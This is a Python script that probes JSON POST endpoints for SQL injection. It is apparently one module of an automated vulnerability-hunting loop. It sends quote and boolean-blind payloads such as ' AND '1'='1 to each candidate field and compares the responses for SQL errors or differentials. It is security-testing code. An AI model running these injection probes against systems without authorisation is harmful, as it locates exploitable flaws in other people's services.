#!/usr/bin/env python3
"""Generic JSON-body-sink SQLi probe for an UNKNOWN JSON sink.

Rule #84: the one loop hunts targets it has never seen — JSON-body
sinks covered only reflected XSS (Rule #80, 4 classes on query, 4 on
form, 1 on xml/cookie/json/header/path). APIs that build SQL from a
JSON field (SPA/API search, filters, sort params in the body) are a
second JSON class the generic set never covered: query-SQLi (Rule #57)
attacks ?params only, never the JSON body, so a JSON-field SQLi never
trips it. A real human hunter tests the body fields too.

The probe takes the sink spec from its marker argv (the one loop
encodes it there so _probe_cmd needs no changes):

    MARKER = PLOOP84|<target_base>|<path>|POST|<field_csv>

Rule #80 PART 2 pattern: the 5th component is a CSV of common JSON
field names (the engine cannot know the API's real field names). The
probe tries each name in order — control+differential per field — and
the first CONFIRMED wins, so the engine budget stays 2 turns per sink.
Every name is validated up front; one bad name fails the whole probe
closed (a quote or brace in the marker must never reach json.dumps as
a key).

Flow (stdlib only), one field at a time (body carries ONLY that field):
  1. STABILITY GATE: POST the same benign JSON twice. If the two
     bodies differ, the endpoint is dynamic/noisy and no claim can be
     grounded -> skip that field (never claim on noise; the Rule #55
     false-positive lesson from the fuzz lane).
  2. ERROR TEST: the benign value + a lone quote. SQL error keywords
     present in the quote response AND ABSENT from the benign
     response, and the quote body differs from the benign body ->
     CONFIRMED (error-based SQLi).
  3. BOOLEAN-BLIND TEST: benign' AND '1'='1 (true) vs benign' AND
     '1'='2 (false). Grounding requires BOTH: the true body equals the
     benign body, AND the false body differs from the true body on
     TWO repeats (the false response is re-fetched to rule out a
     one-shot transient). Differential == blind SQLi -> CONFIRMED.

The benign base is run-unique (benign84-<nonce>): every run is an
independent reconfirm (Rule #81) — no replayed evidence.

A verbatim ECHO of the payload without evaluation is reflection, not
SQLi, and can never confirm: the blind test's true==benign
requirement rejects it, and the error test needs NEW error keywords
absent from the benign body.

Evidence vocabulary (Rule #73): mirrors probe_sink_sqli.py —
  EVIDENCE sink=<path> json_field=<f> error_based hits=<kw> digest=<h>
  EVIDENCE sink=<path> json_field=<f> boolean_blind true_digest=<h> ...
then  EVIDENCE class=sql_injection via=error_based|boolean_blind;
the future claim class is "sqli" (same class as Rule #57, distinct
module generic_jsonsqli — dedup is (module, class, location), so an
endpoint vulnerable via both a query param and a JSON field files two
distinct claims, the Rule #69 rationale).

Fail-closed rules (the probe lesson, 29 Oct):
  - Marker must be PLOOP84|<tb>|<path>|POST|<csv>; non-POST fails
    closed (JSON sinks are POST-only).
  - The JSON field name is validated ([A-Za-z0-9_.[\\]-]{1,64}) —
    a bad name aborts instead of injecting JSON syntax.
  - The control request can never confirm (it carries no injection).
  - Errors, timeouts -> FAILED. Redirects are NOT followed (the probe
    reads the raw body; a redirect endpoint is a different class).
  - No SQL differential on a field -> FIELD <f>: not injectable ->
    VERDICT: FAILED.

One self-contained reproducible command, fixed marker from argv, own
VERDICT line. Any exception -> PROBE_ERROR + VERDICT: FAILED. The
probe never fetches anything external; it only asks the TARGET for a
URL the loop's own scope gate already allowed. No UNION data dumps,
no time-based delays against an unknown target.
"""
import hashlib
import http.client
import json
import os
import re
import sys
import urllib.parse

REQ_TIMEOUT = 15
_FIELD_NAME_RE = re.compile(r"[A-Za-z0-9_.\[\]-]{1,64}\Z")
TRUE_RE = re.compile(r"(?i)and\s+['\"]?1['\"]?\s*=\s*['\"]?1")
FALSE_RE = re.compile(r"(?i)and\s+['\"]?1['\"]?\s*=\s*['\"]?2")

ERROR_KEYWORDS = (
    "you have an error in your sql syntax",
    "warning: mysql", "mysqli", "mysql_fetch", "mysql_num_rows",
    "sqlite", "sqlite3", "pg_query", "postgresql", "unterminated",
    "odbc", "jdbc", "mssql", "sql server", "oracle error", "ora-",
    "sqlstate", "syntax error near",
)


def _raw_post(tb, path, body_dict):
    """POST JSON without following redirects. Returns (code, body)."""
    pu = urllib.parse.urlparse(tb.rstrip("/") + path)
    host, port = pu.hostname, pu.port
    use_ssl = pu.scheme == "https"
    conn_cls = (http.client.HTTPSConnection if use_ssl
                else http.client.HTTPConnection)
    raw = json.dumps(body_dict).encode("utf-8")
    conn = conn_cls(host, port or (443 if use_ssl else 80),
                    timeout=REQ_TIMEOUT)
    try:
        conn.request("POST", pu.path, body=raw,
                     headers={"User-Agent": "PLOOP84",
                              "Content-Type": "application/json",
                              "Content-Length": str(len(raw))})
        resp = conn.getresponse()
        # Error-status bodies are signal too: a lone quote may 500
        # with the SQL error text in the body. Transport errors
        # still fail closed in main().
        body = resp.read().decode("utf-8", "replace")
        return resp.status, body
    finally:
        conn.close()


def _digest(body):
    return hashlib.sha256(body.encode()).hexdigest()[:16]


def _error_hits(body):
    bl = body.lower()
    return [k for k in ERROR_KEYWORDS if k in bl]


def main():
    # argv[1] is the marker: the _probe_cmd wrapper invokes
    #   python3 "$DST" "$MK"   (DST=argv[0], marker=argv[1])
    marker = sys.argv[1] if len(sys.argv) > 1 else "PLOOP84"
    try:
        _, tb_q, path_q, method, field_csv = marker.split("|", 4)
    except ValueError:
        print("PROBE_ERROR bad marker spec: %r" % marker)
        print("VERDICT: FAILED")
        return
    tb = urllib.parse.unquote(tb_q)
    path = urllib.parse.unquote(path_q)
    method = (method or "POST").upper()
    fields = [f.strip() for f in (field_csv or "").split(",")]
    fields = [f for f in fields if f]
    if not tb or not path.startswith("/") or method != "POST":
        print("PROBE_ERROR invalid sink spec "
              "(JSON-SQLi needs a POST path sink)")
        print("VERDICT: FAILED")
        return
    # Every name is validated UP FRONT — one bad name fails the whole
    # probe closed (a quote or brace in the marker must never reach
    # json.dumps as a key).
    for f in fields:
        if not _FIELD_NAME_RE.match(f):
            print("PROBE_ERROR invalid JSON field name %r (fail-closed: "
                  "no JSON-syntax injection via the marker)" % f)
            print("VERDICT: FAILED")
            return
    if not fields:
        print("PROBE_ERROR no JSON field names in marker (fail-closed)")
        print("VERDICT: FAILED")
        return
    nonce = os.urandom(4).hex()
    base = "benign84-" + nonce  # run-unique benign value (Rule #81)
    print("RUN_NONCE %s" % nonce)
    print("EVIDENCE sink=%s marker=%s" % (path, marker))

    confirmed_field = None
    via = None
    for field in fields:
        def run(value):
            return _raw_post(tb, path, {field: value})[1]

        # STABILITY GATE: the identical benign request twice.
        try:
            b1, b2 = run(base), run(base)
        except Exception as exc:
            print("PROBE_ERROR field %s benign fetch failed: %s"
                  % (field, exc))
            continue
        if b1 != b2:
            print("FIELD %s: skipped (dynamic endpoint, baseline "
                  "unstable — no claim grounded)" % field)
            continue
        benign_errors = _error_hits(b1)
        bdigest = _digest(b1)

        # ERROR TEST: a lone quote must introduce SQL error keywords
        # that the benign response does NOT have.
        try:
            qbody = run(base + "'")
        except Exception as exc:
            print("PROBE_ERROR field %s quote fetch failed: %s"
                  % (field, exc))
            continue
        qhits = [k for k in _error_hits(qbody) if k not in benign_errors]
        if qhits and qbody != b1:
            print("EVIDENCE sink=%s json_field=%s error_based hits=%s "
                  "digest=%s" % (path, field, ",".join(qhits[:3]),
                                 _digest(qbody)))
            confirmed_field, via = field, "error_based"
            break

        # BOOLEAN-BLIND TEST: true-branch must match benign, false
        # branch must differ — on two repeats.
        true_v = base + "' AND '1'='1"
        false_v = base + "' AND '1'='2"
        try:
            t1, f1 = run(true_v), run(false_v)
            t2, f2 = run(true_v), run(false_v)
        except Exception as exc:
            print("PROBE_ERROR field %s blind fetch failed: %s"
                  % (field, exc))
            continue
        if t1 == t2 and f1 == f2 and t1 == b1 and f1 != t1:
            print("EVIDENCE sink=%s json_field=%s boolean_blind "
                  "true_digest=%s false_digest=%s benign_digest=%s "
                  "(repeats consistent)" % (path, field, _digest(t1),
                                            _digest(f1), bdigest))
            confirmed_field, via = field, "boolean_blind"
            break
        print("FIELD %s: not injectable (no error keywords, no stable "
              "true/false differential)" % field)

    if confirmed_field and via:
        print("EVIDENCE class=sql_injection via=%s" % via)
        print("VERDICT: CONFIRMED")
    else:
        print("VERDICT: FAILED")


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print("PROBE_ERROR: %s" % exc)
        print("VERDICT: FAILED")
